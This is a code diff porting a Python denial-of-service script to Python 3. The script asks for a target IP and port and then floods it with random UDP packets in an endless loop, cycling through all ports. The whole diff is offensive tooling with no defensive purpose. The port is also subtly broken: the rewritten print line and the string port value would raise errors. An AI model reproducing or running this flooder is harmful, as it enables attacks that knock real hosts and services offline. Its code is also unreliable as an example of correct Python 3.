@@ -18,12 +18,12 @@ bytes = random._urandom(1490)
 #############
 
 os.system("clear")
-os.system("DDos Attack")
+os.system("figlet DDos Attack")
 print ("Modded by:  neon-l")
-ip = raw_input("Your Target IP : ")
+ip = input("Your Target IP : ")
 port = input("Target Port      : ")
 os.system("clear")
-os.system("Attack Starting")
+os.system("figlet Attack Starting")
 print ("[                    ] 0% ")
 time.sleep(1)
 print ("[=====               ] 25%")
@@ -39,7 +39,7 @@ while True:
      sock.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
-     print "Sent %s packets to %s throught port:%s"%(sent,ip,port)
+     print ("Sent %s packets to %s throught port:%s")%(sent,ip,port)
      if port == 65534:
        port = 1
 
